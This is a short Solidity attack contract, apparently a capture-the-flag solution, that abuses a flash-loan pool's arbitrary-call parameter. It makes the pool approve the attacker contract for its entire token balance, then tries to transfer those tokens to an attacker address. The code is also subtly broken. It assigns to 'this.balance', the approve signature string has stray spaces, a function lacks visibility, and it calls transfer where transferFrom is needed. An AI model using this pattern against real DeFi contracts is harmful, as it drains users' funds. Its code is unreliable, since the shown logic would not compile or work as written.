pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPoolFunc {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterAttack {
    using Address for address payable;
    uint256 public balance;
    constructor(address payable poolAddress,
                 
                address tokenAddress,
                address attackerAddress
                )
    {
        //Idea

        //call flashLoan with x borrowAmount, borrower = this
        //target = token 
        this.balance = IERC20(tokenAddress).balanceOf(poolAddress);
        IPoolFunc(poolAddress).flashLoan(
            0,
            address(this),
            tokenAddress,
            abi.encodeWithSignature(
                "approve(address , uint256) ",
                address(this),
                this.balance
            )
        );
        //IERC20(tokenAddress).transfer(attackerAddress, balance);
        //calldata = approve(pool, this)
        //response 
        //token.tranfser(amount,attacker)
        //
    }
    function transferMe(address tokenAddress, address attackerAddress){
        IERC20(tokenAddress).transfer(attackerAddress, this.balance);
    }

   
}